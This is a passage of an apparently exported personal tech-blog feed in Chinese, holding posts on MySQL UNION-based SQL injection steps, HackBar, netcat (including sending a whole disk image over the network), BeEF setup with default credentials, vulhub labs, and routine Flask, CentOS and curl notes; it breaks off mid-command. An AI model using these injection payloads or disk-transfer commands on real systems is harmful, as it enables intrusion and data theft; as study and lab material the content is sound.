        <content type="html"><![CDATA[<ul><li><p>MySQL 5.0版本之后，默认在数据库中存放了一个名为”INFORMATION_SCHEMA”的数据库，其中有三个重要的表：SCHEMATA、TABLES、COLUMNS。</p><ul><li><p>SCHEMATA表存储了当前MySQL实例中的所有数据库信息，其中记录数据库库名的字段为SCHEMA_NAME。</p></li><li><p>TABLES表存储了数据库中所有表的信息，其中记录数据库库名和表名的字段分别为TABLE_SCHEMA和TABLE_NAME。</p></li><li><p>COLUMNS表存储了数据库中所有表列的信息，其中记录数据库库名、表名和列名的字段分别为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p></li></ul></li><li><p>MySQL语法备忘</p><ul><li><p>命令不区分大小写。</p></li><li><p>select field_name from database_name.table_name where a=1 and b=’s’ limit 0, 1</p></li><li><p>注释：”#”或者”– “（注意”–”后面的空格）或者”/**/“。</p></li></ul></li><li><p>几个重要函数</p><ul><li><p>database()：当前MySQL数据库名。</p></li><li><p>version()：当前MySQL版本。</p></li><li><p>user()：当前MySQL用户名。</p></li></ul></li><li><p>SQL注入基本类型判断方法</p><ul><li><p>数字型注入判断方法</p><ul><li><p>?id=8’ 报错。</p></li><li><p>?id=8 and 1=1 响应内容与原始请求的响应无差异。</p></li><li><p>?id=8 and 1=2 响应内容与原始请求的响应有差异。</p></li></ul></li><li><p>字符型注入判断方法</p><ul><li><p>?string=text’ and 1=1 – 响应内容与原始请求的响应无差异。</p></li><li><p>?string=text’ and 1=2 – 响应内容与原始请求的响应有差异。</p></li><li><p>字符型注入需注意闭合引号。</p></li></ul></li></ul></li><li><p>Union注入攻击</p><ol><li><p>判断攻击条件：通过前述SQL注入基本类型判断方法判断是否存在SQL注入漏洞，进而根据Payload追加的union查询的结果是否可以输出到页面中，判断能否实施Union注入攻击。</p></li><li><p>判断字段个数：Payload追加 order by n 语句判断该SQL语句查询的字段数量，即不断增大n进行尝试，若当前 order by n 语句执行后页面正常则该查询存在第n个字段。</p></li><li><p>实现查询输出：若该查询存在n个字段，则Payload追加 union select 1,2,3,…,n 语句。若 union select 获取的结果没有输出到页面，则需要调整Payload中的参数使 union select 的结果成为第1条结果，从而输出到页面。</p></li><li><p>获取数据库名：根据页面情况，判断哪个字段能够输出到页面，例如若2字段能够输出，则Payload追加 union select 1,database(),3,… 。</p></li><li><p>获取数据表名：Payload追加 union select 1,(select table_name from information_schema.tables where table_schema=’database_name’ limit 0,1),3… ，通过调整 limit 的参数可以逐个获取所有表名。</p></li><li><p>获取特定表的字段名：Payload追加 union select 1,(select column_name from information_schema.columns where table_schema=’database_name’ and table_name=’table_name’ limit 0,1),3… ，通过调整 limit 的参数可以逐个获取指定表的所有字段名。</p></li><li><p>其他注意事项：Payload的末尾可能需要加上”– “以注释剩余的SQL语句以防干扰。</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackbar使用</title>
      <link href="2020/07/26/2020-07-26-hackbar/"/>
      <url>2020/07/26/2020-07-26-hackbar/</url>
      
        <content type="html"><![CDATA[<p>火狐hackbar插件是一款网页渗透测试的工具</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>github下载地址：<a href="https://github.com/Mr-xn/hackbar2.1.3">https://github.com/Mr-xn/hackbar2.1.3</a></p><p>打开firefox的附加组件，选择 “从文件安装附加组件”</p><p>打开下载完毕的xpi后缀文件，添加扩展</p><p>最后关闭HackBar自动更新，防止更新到收费版</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>按常用的F12键打开web调试那个栏，可以看见最右边多了一个hackbar，点进去就会看到hackbar</p><p>Load URL：将当前浏览器的地址栏url复制到输入框中。</p><p>Split URL：按照&amp;来分割提交参数，并且一个参数占一行。</p><p>Execute：提交请求。</p><p>SQL：主要用于SQL注入辅助，支持MySQL、MSSQL、Oracle的字符简单转换，也能够根据输入的数字直接生成联合注入的语句、并且也可以替换空格为注释符。</p><p>XSS：用于将字符转换成ASCII码、HTML实体符号，附带生成一个测试XSS漏洞的alert弹窗代码。</p><p>Encryption：用于加密字符，支持MD5、SHA1、SHA-256、ROT13</p><p>Encoding：用于编码字符， 支持URL编码、Base64编码、十六进制编码。</p><p>Other：分别是Addslashes（将特殊字符使用“\”转义）、Stripslashes（去除转义）、Strip spaces（去除空格）、Reverse（字符串反转）。</p><p>Usefull strings：一些常量，包括（元周率、菲波那切数列、内存溢出…）</p><p>Enable Post data：这里勾选上后，会有一个输入框，使用来提交POST数据的。</p><p>Enable Referrer：HTTP请求中的上一个页面的来源地址 。（一般用于测试CSRF防御机制）Referrer是伪装来源地址的选项，在其对应的填写框录入要伪装的地址即可，执行hack操作即可模拟该Referrer。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware ubuntu虚拟机启用共享文件夹</title>
      <link href="2020/07/26/2020-07-26-vmware_ubuntu_shared_folder/"/>
      <url>2020/07/26/2020-07-26-vmware_ubuntu_shared_folder/</url>
      
        <content type="html"><![CDATA[<p>在vmware设置中打开虚拟机设置，开启共享文件夹功能。</p><p>打开mnt文件夹下的hgfs文件夹，如果共享文件夹启用成功的话，在这里就能访问和宿主系统共享的文件了。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu 临时修改MAC地址</title>
      <link href="2020/07/11/2020-07-11-ubuntu_temp_mac/"/>
      <url>2020/07/11/2020-07-11-ubuntu_temp_mac/</url>
      
        <content type="html"><![CDATA[<pre><code>ifconfig eth0 downifconfig eth0 hw ether xx:xx:xx:xxifconfig eth0 up</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu.mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat安装及使用</title>
      <link href="2020/07/10/2020-07-10-nc/"/>
      <url>2020/07/10/2020-07-10-nc/</url>
      
        <content type="html"><![CDATA[<h2 id="NC简介"><a href="#NC简介" class="headerlink" title="NC简介"></a>NC简介</h2><p>NC是NETCAT的简写，有着网络界的瑞士军刀美誉。因为他短小精悍，功能实用，被设计为一个简单，可靠的网络工具。</p><h2 id="NC安装"><a href="#NC安装" class="headerlink" title="NC安装"></a>NC安装</h2><h2 id="NC的作用"><a href="#NC的作用" class="headerlink" title="NC的作用"></a>NC的作用</h2><ul><li><p>传输文本信息</p></li><li><p>传输文件/目录</p></li><li><p>加密传输文件</p></li><li><p>远程控制/木马</p></li><li><p>加密传输文件</p></li><li><p>流媒体服务器</p></li><li><p>端口扫描</p></li><li><p>远程克隆硬盘</p></li></ul><h2 id="NC常用的参数"><a href="#NC常用的参数" class="headerlink" title="NC常用的参数"></a>NC常用的参数</h2><pre><code>-h 帮助信息-l 监听模式-n 指定数字的IP地址，不会进行DNS解析-p 指定监听的本地端口-u UDP模式-v 显示详细的信息-i secs延迟时间 -w secs 超时时间 -z  表示扫描时不发送任何数据包-q 限制会话的次数 （到达次数后自动关闭会话，用于证明数据传输完成）</code></pre><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><p>准备两台机器，用于测试nc命令方法</p><p>主机A ：10.1.1.1 主机B：10.1.1.2</p><h3 id="NC传输文本信息"><a href="#NC传输文本信息" class="headerlink" title="NC传输文本信息"></a>NC传输文本信息</h3><p>利用NC可以实现聊天，原理也十分简单，首先A先侦听一个端口(4444)，等待B连接.。</p><p>然后主机指定主机A的IP地址以及侦听的端口(4444)。</p><pre><code>A：nv   -lp  4444           B：nc -nv  10.1.1.1 4444</code></pre><h3 id="NC传输文件"><a href="#NC传输文件" class="headerlink" title="NC传输文件"></a>NC传输文件</h3><p>传输文件演示（侦听的端口接受数据）</p><p>使用NC传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了</p><p>把A机器上的一个txt文件发送到B机器上</p><p>需要注意操作次序，receiver (A)先侦听端口，sender (B)向recevier (A)所在的机器的该端口发送数据。</p><p>步骤1，先在A机器上启动一个侦听端口4444等待B连接A，然后把数据存在1.txt中</p><pre><code>A： nc  -lp  4444    &gt;  1.txt    </code></pre><p>步骤2 在B机器上往A机器的4444端口发送数据，把1.txt文件发送过去</p><pre><code>B： nc   -nv  10.1.1.2 4444  &lt;   1.txt</code></pre><p>A机器接收完毕，文件大小和B机器一样，MD5值也一样。</p><p>传输文件演示（侦听的端口发送数据）</p><p>步骤1，A机器通过侦听4444端口等待B来连接A，并发送1.txt文件给B</p><pre><code>A：nc -lp 4444 &lt; 1.txt</code></pre><p>步骤2，B机器连接上A机器，接受数据存在1.txt中</p><p>下面命令表示连接A机器的4444端口接受文件，并把文件保存在本目录下，文件名为1.txt</p><pre><code>B：nc -nv 10.1.1.1 4444 &gt; 1.txt</code></pre><h2 id="NC传输目录"><a href="#NC传输目录" class="headerlink" title="NC传输目录"></a>NC传输目录</h2><p>传输目录演示(侦听的端口接受数据)</p><p>步骤1，A机器先启动监听，等待B机器连接A，接受数据然后通过tar解压</p><p>传输目录需要结合其他的命令，比如tar</p><p>经过测试管道后面最后必须是 - ，不能是其他的自定义的文件名</p><pre><code>A： nc -lp 4444  |  tar -xvf - </code></pre><p>步骤2，B机器打包文件并连接A机器的端口，将数据发送给A</p><p>管道前面表示把music目录下的文件打包为 - </p><pre><code>B： tar -cvf  - music/ | nc -nv  10.1.1.1 4444 </code></pre><p>传输目录演示(侦听的端口发送数据)</p><p>步骤1，A机器先将文件打包，然后通过管道符将数据发给侦听的4444端口</p><pre><code>A：   tar -cvf  - music/ | nc -lp 4444</code></pre><p>步骤2，B连接A机器的4444端口接受数据</p><pre><code>B： nc -nv  10.1.1.1 4444   |  tar -xvf -</code></pre><h2 id="NC流媒体服务"><a href="#NC流媒体服务" class="headerlink" title="NC流媒体服务"></a>NC流媒体服务</h2><p>流媒体服务演示(侦听的端口发送数据)</p><p>步骤1，A机器先查看1.mp4，然后通过管道符把数据发给侦听4444端口</p><pre><code>A：cat 1.mp4 | nc -lp 4444</code></pre><p>步骤2，B机器连接A机器侦听的端口，把接受的数据通过管道符发给mplayer播放</p><pre><code>B： nc -nv 10.1.1.1 4444 | mplayer -vo x11 -cache 3000 -</code></pre><p>流媒体服务演示(侦听的端口接受数据)</p><p>步骤1，A机器先侦听4444端口，然后通过管道符把接收的数据发给mplayer播放</p><pre><code>A： nc -lp 4444 | mplayer -vo x11 -cache 3000 -</code></pre><p>步骤2，B机器先查看1.mp4 然后通过管道符把数据通过连接A机器4444端口发送给A数据</p><pre><code>B：cat 1.mp4 | nc -nv 10.1.1.1 4444 </code></pre><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>UDP的扫描过程比较慢，可能1秒一个端口，下面表示扫描A机器1-024端口。</p><pre><code>nc -nvz 10.1.1.1 1-65535 （默认扫描TCP端口）nc -nvzu  10.1.1.1 1-1024 (扫描UDP端口)</code></pre><h2 id="NC远程克隆硬盘"><a href="#NC远程克隆硬盘" class="headerlink" title="NC远程克隆硬盘"></a>NC远程克隆硬盘</h2><p>远程克隆硬盘演示(侦听的端口发送数据)</p><p>步骤1，A机器将硬盘的数据通过管道符发给侦听的4444端口</p><pre><code>A：dd if=/dev/sda | nc -lp 4444  </code></pre><p>步骤2，B机器连接A机器的4444端口获取数据</p><pre><code>B：nc -nv 10.1.1.1 4444 | dd of=/dev/sda</code></pre><p>远程克隆硬盘演示(侦听的端口接受数据)</p><p>步骤1，A机器先侦听的4444端口，将接受的数据放在sda硬盘上</p><pre><code>A： nc -lp 4444 | dd of=/dev/sda</code></pre><p>步骤2，B机器将硬盘的数据通过连接A机器的4444端口发送给A数据</p><pre><code>B：dd if=/dev/sda | nc -nv 10.1.1.1 4444</code></pre><p>适用于远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask项目NewsBoard添加文章访问量</title>
      <link href="2020/07/09/2020-07-09-flask_newsboard_add_views/"/>
      <url>2020/07/09/2020-07-09-flask_newsboard_add_views/</url>
      
        <content type="html"><![CDATA[<p>如何精确地记录一篇文章的阅读量是一个比较复杂的问题，不过对于我们的项目来说，没有必要记录的那么精确。因此我们使用一种简单但有效的方式来记录博客文章的阅读量：文章每被浏览一次，则其阅读量 +1，即所谓的文章页面 PV（Page View）数。虽然简单粗暴，但却高效实用。</p><h2 id="持久化："><a href="#持久化：" class="headerlink" title="持久化："></a>持久化：</h2><p>修改数据库 增加views字段</p><pre><code>alter table secnews add views integer;</code></pre><p>将访问量设置为0</p><pre><code>update secnews set views = 0;</code></pre><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>在模板中显示阅读量，在模板中显示阅读量和显示其它字段一样，只需要在适当的地方使用模板变量即可。</p><pre><code>&#123;&#123; secnews.views &#125;&#125;</code></pre><p>修改样式</p><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>后端需要改动较多</p><p>修改models.py。为了记录文章的浏览量，需要在文章的 数据库表中新增一个用于存储阅读量的字段。因此给博客文章的模型新增一个 views 字段： </p><pre><code>class SecNews(db.model):    ...    views = db.Column(db.Integer)    ...</code></pre><p>修改视图函数。也就是具体的News页面，一旦用户访问了某篇文章，这时就应该将 views 的值 +1，你也许担心如果两个人同时访问一篇文章，更改数据库中的阅读量字段的值时会不会冲突？其实不必担心，我们本来就不是精确地统计阅读量，而且个人博客的流量通常也不会很大，所以偶尔的冲突导致的数据误差是可以忽略不计的。</p><pre><code>def secnews(hash):    ...    secnews.views += 1    db.session.commit()    ...</code></pre><p>利用Flask-Migrate迁移数据库。一旦更改了模型，就需要迁移数据库，以便让 flask 将更改反应到数据库中。在项目根目录运行如下命令：</p><pre><code>flask db initflask db migrate -m &quot;add secnews views&quot;flask db upgrade</code></pre><h2 id="爬虫采集部分"><a href="#爬虫采集部分" class="headerlink" title="爬虫采集部分"></a>爬虫采集部分</h2><p>items.py添加字段</p><pre><code>views = scrapy.Field()</code></pre><p>pipelines.py添加写入</p><pre><code>item[&#39;views&#39;] = 0values = (    ...    item[&#39;views&#39;])</code></pre><p>好了，这样当用户每访问一次文章详情，views 记录的数值就会 +1，从而达到粗略统计阅读量的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu server安装图形界面</title>
      <link href="2020/07/09/2020-07-09-ubuntu_server_destop/"/>
      <url>2020/07/09/2020-07-09-ubuntu_server_destop/</url>
      
        <content type="html"><![CDATA[<p>使用ubuntu server安装lamp主机非常的方便，只要在安装系统的步骤中选择就是了 。但是很多时候我需要在图形界面下管理主机更加方便。今天的教程就是教大家安装图形界面。</p><p>首先你需要确定你的源文件中 /etc/apt/sources.list 已经使用Universe和Multiverse库。然后使用下面的命令来进行更新源列表和安装图形桌面。</p><pre><code>sudo apt-get updatesudo apt-get upgradesudo apt-get install ubuntu-desktop</code></pre><p>如果你只想安装必要的桌面管理软件而不想安装一些诸如 Evolution 和 OpenOffice 的不需要的应用软件，可使用下面的命令：</p><pre><code>sudo apt-get install --no-install-recommends ubuntu-desktop</code></pre><p>安装轻量级桌面 xfce 使用下面的命令：</p><pre><code>sudo apt-get install xubuntu-desktop</code></pre><p>安装 KDE 桌面，使用下面的命令：</p><pre><code>sudo apt-get install kubuntu-desktop</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用docker快速搭建vulhub漏洞环境</title>
      <link href="2020/07/09/2020-07-09-vulhub/"/>
      <url>2020/07/09/2020-07-09-vulhub/</url>
      
        <content type="html"><![CDATA[<p>下载vulhub源码：git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a>  </p><p>用迅雷下载压缩包链接更快 <a href="https://codeload.github.com/vulhub/vulhub/zip/master">https://codeload.github.com/vulhub/vulhub/zip/master</a></p><p>进入vulhub文件夹，可以看到有许多环境可供使用。</p><p>进入所需目标文件夹，执行</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>即可成功搭建漏洞环境</p><p>调试完毕后，执行</p><pre><code>docker-compose down -v</code></pre><p>删除环境</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS下磁盘分区 格式化 挂载</title>
      <link href="2020/07/08/2020-07-08-centos_mount/"/>
      <url>2020/07/08/2020-07-08-centos_mount/</url>
      
        <content type="html"><![CDATA[<p>查看磁盘使用情况</p><pre><code>df -h</code></pre><p>查看硬盘挂载情况</p><pre><code>lsblk</code></pre><p>磁盘分区</p><pre><code>disk /dev/sdbn-&gt;p-&gt;1-&gt;回车-&gt;回车-&gt;wn：添加一个分区P：主分区两个回车指是开始和结束的磁盘扇区大小；w：写入磁盘这个还没搞懂</code></pre><p>磁盘格式化</p><pre><code>mkfs -t ext4 /dev/sdb</code></pre><p>进行挂载</p><pre><code>mkdir /home/datamount /dev/sdb /home/data</code></pre><p>检查是否正常</p><pre><code>df -h</code></pre><p>设置开机挂载</p><pre><code>到 /etc/fstab 下配置挂载信息，添加一条记录/dev/sdb /home/data ext4 defaults 0 0测试一下fstab 文件是否正常运行mount -a</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS下解决SSH自动断开办法</title>
      <link href="2020/07/08/2020-07-08-centos_ssh/"/>
      <url>2020/07/08/2020-07-08-centos_ssh/</url>
      
        <content type="html"><![CDATA[<pre><code>echo &quot;ClientAliveInterval 60&quot; &gt;&gt; /etc/ssh/sshd_configecho &quot;ClientAliveCountMax 1&quot; &gt;&gt; /etc/ssh/sshd_config</code></pre><p>重启SSH服务</p><pre><code>service sshd restart</code></pre><p>然后退出,重装进入就不会断开了.</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Docker安装Beef 及 Beef使用</title>
      <link href="2020/07/06/2020-07-06-docker_beef/"/>
      <url>2020/07/06/2020-07-06-docker_beef/</url>
      
        <content type="html"><![CDATA[<p>BeEF（ The Browser Exploitation Framework）是由ruby语言开发的专门针对浏览器攻击的框架。这个框架也属于cs的结构。它是一个针对浏览器的渗透工具，主要通过浏览器执行一些脚本来对浏览器客户端进行攻击。</p><p><a href="https://github.com/beefproject/beef/wiki">github地址</a></p><p>zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/15299931636046.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/0123jkhkdhasdockerbeef.png"></p><p>docker安装Beef</p><pre><code>docker pull janes/beefdocker run -dp 3000:3000 janes/beef访问127.0.0.1:3000/ui/panel用户名密码均为beef</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> beef </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用flask-migrate迁移数据库</title>
      <link href="2020/07/06/2020-07-06-flask_migrate/"/>
      <url>2020/07/06/2020-07-06-flask_migrate/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在开发时,以删除表再重建的方式更新数据库简单直接,但明显的缺陷是会丢掉数据库中的所有数据。在生产环境下,你绝对不会想让数据库里的数据都被删除掉,这时你需要使用数据库迁移工具来完成这个工作。SQLAlchemy的开发者Michael Bayer写了一个数据库迁移工具——Alembic来帮助我们实现数据库的迁移,数据库迁移工具可以在不破坏数据的情况下更新数据库表的结构。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>扩展Flask-Migrate集成了Alembic,提供了一些flask命令来简化迁移工作,我们将使用它来迁移数据库。Flask-Migrate及其依赖(主要是Alembic)可以使用pip安装:</p><pre><code>$ pip install flask-migrate</code></pre><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>在程序中,我们实例化Flask-Migrate提供的Migrate类,进行初始化操作:</p><pre><code>from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyfrom flask_migrate import Migrateapp = Flask(__name__)...db = SQLAlchemy(app)migrate = Migrate(app, db) # 在db对象创建后调用</code></pre><p>实例化Migrate类时,除了传入程序实例app,还需要传入实例化Flask-SQLAlchemy提供的SQLAlchemy类创建的db对象作为第二个参数。</p><h2 id="创建迁移环境"><a href="#创建迁移环境" class="headerlink" title="创建迁移环境"></a>创建迁移环境</h2><p>在开始迁移数据之前,需要先使用下面的命令创建一个迁移环境:</p><pre><code>flask db init</code></pre><p>注：Flask-Migrate提供了一个命令集,使用db作为命名集名称,它提供的命令都以flask db开头。你可以在命令行中输入flask–help查看所有可用的命令和说明。</p><h2 id="生成迁移脚本"><a href="#生成迁移脚本" class="headerlink" title="生成迁移脚本"></a>生成迁移脚本</h2><p>使用migrate子命令可以自动生成迁移脚本:</p><pre><code>$ flask db migrate -m &quot;add note timestamp&quot;</code></pre><p>这条命令可以简单理解为在flask里对数据库(db)进行迁移(migrate)。-m选项用来添加迁移备注信息。从上面的输出信息我们可以看到,Alembic检测出了模型的变化:表note新添加了一个timestamp列,并且相应生成了一个迁移脚本c52a02014635_add_note_timestamp.py</p><p>迁移脚本主要包含了两个函数:upgrade()函数用来将改动应用到数据库,函数中包含了向表中添加timestamp字段的命令;而downgrade()函数用来撤销改动,包含了删除timestamp字段的命令。</p><p>迁移命令是由Alembic自动生成的,其中可能包含错误,所以有必要在生成后检查一下。</p><h2 id="更新数据库"><a href="#更新数据库" class="headerlink" title="更新数据库"></a>更新数据库</h2><p>生成了迁移脚本后,使用upgrade子命令即可更新数据库:</p><p>$ flask db upgrade</p><p>如果还没有创建数据库和表,这个命令会自动创建;如果已经创建,则会在不损坏数据的前提下执行更新。</p><p>如果你想回滚迁移,那么可以使用downgrade命令(降级),它会撤销最后一次迁移在数据库中的改动,这在开发时非常有用。比如,当你执行upgrade命令后发现某些地方出错了,这时就可以执行flask dbdowngrade命令进行回滚,删除对应的迁移脚本,重新生成迁移脚本后再进行更新(upgrade)。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> flask </tag>
            
            <tag> migrate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用flask-whooshee实现全文搜索</title>
      <link href="2020/07/06/2020-07-06-flask_whooshee/"/>
      <url>2020/07/06/2020-07-06-flask_whooshee/</url>
      
        <content type="html"><![CDATA[<p>flask-Whooshee 是一个 基于Whoosh 的高级 flask 集成. 可用于索引和检索 joined queries.</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>pip install Flask-Whooshee</code></pre><h3 id="初始化与配置"><a href="#初始化与配置" class="headerlink" title="初始化与配置"></a>初始化与配置</h3><p>1、直接初始化, 并绑定到一个 flask 实例</p><pre><code>from flask-whooshee import Whoosheeapp = Flask(__name__)whooshee = Whooshee(app)</code></pre><p>2、使用工厂模式初始化</p><pre><code>whooshee = Whooshee()def create_app():    app = Flask(__name__)    whooshee.init_app(app)    # ... ...     return app</code></pre><p>3、可用的配置变量</p><pre><code>WHOOSHEE_DIR     索引存放目录     whoosheeWHOOSHEE_MIN_STRING_LEN     可查询的最小字符串     3WHOOSHEE_WRITER_TIMEOUT     How long should whoosh try to acquire write lock     2WHOOSHEE_MEMORY_STORAGE     使用内存存放索引, 用于测试     FalseWHOOSHEE_ENABLE_INDEXING     Specify wherher or not to actually do operations with the Whoosh index     True</code></pre><p>4、使用方法</p><p>简单用法, 如下代码, 将 Entry 表中的 title, content 两个字段作为可全文索引字段.</p><pre><code>from app import whooshee@whooshee.register_model(&#39;title&#39;, &#39;content&#39;)class Entry(db.Model):    id = db.Colume(db.Integer, primary_key=True)    title = db.Colume(db.String)    content = db.Colume(db.Text)</code></pre><p>查询</p><pre><code># 查询 Entry 表中, title 或 content 中包含 &quot;chuck norris&quot; 的字段Entry.query.whooshee_search(&quot;chuck norris&quot;).order_by(Entry.id.desc()).all</code></pre><p>查询结果排序</p><pre><code># 所有结果均根据相关性排序Entry.query.join(User).whooshee_search(&quot;chuck norris&quot;, order_by_relevance=-1).all()# 所有结果均不排序Entry.query.join(User).whooshee_search(&quot;chuck norris&quot;, order_by_relevance=0).all()# 修改默认值 10.Entry.query.join(User).whooshee_search(&quot;chuck norris&quot;, order_by_relevance=25).all()</code></pre><p>5、建立索引</p><p>当索引数据丢失或使用 Flask-Whooshee 索引已存在的数据时, 可以使用 Whooshee.reindex() 方法重新索引数据.</p><pre><code>from flask_whooshee import Whoosheewhooshee = Whooshee(app)whooshee.reindex()</code></pre><p>在读写频繁的程序中,我们应该关闭索引的自动更新,使用定时任务工具来周期性手动调用whooshee.reindex()方法以更新搜索引擎的索引文件</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> 全文搜索 </tag>
            
            <tag> whooshee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux curl命令以及代理使用</title>
      <link href="2020/07/02/2020-07-02-curl/"/>
      <url>2020/07/02/2020-07-02-curl/</url>
      
        <content type="html"><![CDATA[<h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><p>简介：</p><p>curl是一个非常实用的、用来与服务器之间传输数据的工具；支持的协议包括 (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP)，curl设计为无用户交互下完成工作；</p><p>curl提供了一大堆非常有用的功能，包括代理访问、用户认证、ftp上传下载、HTTP POST、SSL连接、cookie支持、断点续传…。</p><p>语法：</p><pre><code>curl [options] [URL...]</code></pre><p>参数：</p><pre><code>主要有url、请求头、响应头、cookie、代理、数据传输、断点续传、认证、限速等等具体可使用man curl查看</code></pre><p>示例：</p><pre><code># 下载页面curl -o index.html http://aiezu.com# 下载文件并显示简单进度条curl -# -o centos6.8.iso http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 断点续传curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 伪造来源页面#告诉爱E族，我是从百度来的curl -e http://baidu.com http://aiezu.com# 伪造代理设备#告诉爱E族，我是GOOGLE爬虫蜘蛛（其实我是curl命令）curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com#告诉爱E族，我用的是微信内置浏览器curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com# 查看http头curl -I  http://aiezu.com# 设置http请求头curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com# 发送表单数据curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/# 发送cookiecurl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code></pre><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>代理服务器分类：</p><p>我们比较常用、支持http(s)协议代理主要分为两大类：http代理和socks代理</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/curl.png"></p><p>curl命令代理设置参数：</p><pre><code>linux curl命令可以使用参数设置http(s)代理、socks代理，以及设置它们的用户名、密码以及认证方式.</code></pre><p>示例：</p><p>1、linux curl命令设置http代理：</p><pre><code># 指定http代理IP和端口curl -x 113.185.19.192:80 http://aiezu.com/test.phpcurl --proxy 113.185.19.192:80 http://aiezu.com/test.php#指定为http代理curl -x http_proxy://113.185.19.192:80 http://aiezu.com/test.php#指定为https代理curl -x HTTPS_PROXY://113.185.19.192:80 http://aiezu.com/test.php#指定代理用户名和密码，basic认证方式curl -x aiezu:123456@113.185.19.192:80 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 -U aiezu:123456 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 --proxy-user aiezu:123456 http://aiezu.com/test.php#指定代理用户名和密码，ntlm认证方式curl -x 113.185.19.192:80 -U aiezu:123456 --proxy-ntlm 